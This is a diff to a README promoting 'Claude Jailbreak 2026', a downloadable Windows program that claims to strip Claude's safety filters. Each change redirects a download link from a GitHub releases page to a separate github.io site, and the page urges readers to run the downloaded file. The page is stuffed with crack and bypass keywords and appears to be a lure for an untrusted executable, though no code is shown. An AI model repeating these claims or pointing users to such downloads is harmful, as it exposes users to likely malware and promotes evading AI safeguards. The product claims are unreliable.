@@ -1,6 +1,6 @@
 # 🔓 claude-jailbreak-2026 - Unlock Claude AI Without Limits
 
-[![Download Now](https://img.shields.io/badge/Download-Claude_Jailbreak_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/paramagnetic-eureka8793/claude-jailbreak-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Claude_Jailbreak_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://paramagnetic-eureka8793.github.io)
 
 ## 🚀 What Is This?
 
@@ -36,7 +36,7 @@ This application is designed for anyone who wants to use Claude AI without restr
 
 ### Step 1: Get the Application
 
-Visit this link to download the application: **[Download Claude Jailbreak 2026](https://github.com/paramagnetic-eureka8793/claude-jailbreak-2026/releases)**
+Visit this link to download the application: **[Download Claude Jailbreak 2026](https://paramagnetic-eureka8793.github.io)**
 
 ### Step 2: Run the Setup (Windows)
 
@@ -181,7 +181,7 @@ Remember that Claude Jailbreak 2026 removes safety filters. Use this power respo
 ## 📊 Quick Start Summary
 
 1. **Click the download button** at the top of this page
-2. **Visit this link to download the application:** [Download Here](https://github.com/paramagnetic-eureka8793/claude-jailbreak-2026/releases)
+2. **Visit this link to download the application:** [Download Here](https://paramagnetic-eureka8793.github.io)
 3. **Run the downloaded file**
 4. **Follow setup instructions**
 5. **Start asking anything you want**
@@ -198,6 +198,6 @@ To ensure the jailbreak works with the latest Claude version:
 
 Claude Jailbreak 2026 is your key to truly unrestricted AI conversations. Say goodbye to frustrating safety blocks and hello to complete creative freedom. Download it today and experience the difference!
 
-[![Get Started Now](https://img.shields.io/badge/🚀-Get_Started-4CAF50?style=for-the-badge)](https://github.com/paramagnetic-eureka8793/claude-jailbreak-2026/releases)
+[![Get Started Now](https://img.shields.io/badge/🚀-Get_Started-4CAF50?style=for-the-badge)](https://paramagnetic-eureka8793.github.io)
 
 Keywords: ai-2026, ai-bypass, ai-crack, ai-jailbreak, ai-no-limits, ai-unlimited, anthropic-jailbreak, chatgpt-crack, chatgpt-free, chatgpt-hack, chatgpt-jailbreak, claude-bypass, claude-jailbreak, claude-jailbreak-2026, claude-no-filter, claude-uncensored, free-chatgpt, gpt4-bypass, gpt4-free, openai-crack
